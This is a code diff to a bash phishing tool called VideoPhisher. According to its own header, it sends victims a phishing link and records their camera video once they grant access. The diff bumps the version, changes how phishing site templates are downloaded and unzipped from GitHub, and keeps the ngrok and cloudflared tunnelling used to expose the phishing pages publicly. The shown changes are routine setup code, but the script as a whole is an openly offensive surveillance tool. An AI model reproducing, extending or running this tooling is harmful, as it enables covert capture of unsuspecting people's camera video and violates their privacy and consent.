@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # VideoPhisher
-# Version    : 1.0
+# Version    : 1.1
 # Description: VidPhisher is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her video will be captured!
 # Author     : KasRoudra
 # Github     : https://github.com/KasRoudra
@@ -111,7 +111,7 @@ success="${cyan}[${white}√${cyan}] ${green}"
 
 
 
-version="1.0"
+version="1.1"
 
 cwd=`pwd`
 
@@ -508,7 +508,7 @@ if ! [[ -e $HOME/.ngrok2/ngrok.yml ]]; then
         cd $HOME/.ngrokfolder && ./ngrok authtoken ${auth}
     fi
 fi
-cd "$cwd/sites"
+
 # Start Point
 while true; do
 clear
@@ -615,14 +615,15 @@ if [ -e websites.zip ]; then
     unzip websites.zip > /dev/null 2>&1
     rm -rf websites.zip
 fi
-if ! [ -d $dir ]; then
-    mkdir $dir
-    internet
-    wget -q --show-progress "https://github.com/KasRoudra/files/raw/main/vidphisher/${dir}.zip"
-    unzip ${dir}.zip > /dev/null 2>&1
-    rm -rf ${dir}.zip
-fi
 
+cd "$cwd"
+if ! [ -d "sites" ]; then
+    wget -q --show-progress https://github.com/KasRoudra/VidPhisher/releases/latest/download/websites.zip
+    mkdir sites
+    unzip websites.zip -d sites > /dev/null 2>&1
+    rm -rf websites.zip
+fi
+cd sites
 # Hotspot required for termux
 if $termux; then
     echo -e "\n${info2}If you haven't turned on hotspot, please enable it!"
@@ -650,7 +651,6 @@ else
     cd $HOME/.cffolder && ./cloudflared tunnel -url "127.0.0.1:${PORT}" --logfile "log.txt" > /dev/null 2>&1 &
 fi
 sleep 8
-cd "$cwd/sites"
 ngroklink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
 if (echo "$ngroklink" | grep -q "ngrok"); then
     ngrokcheck=true
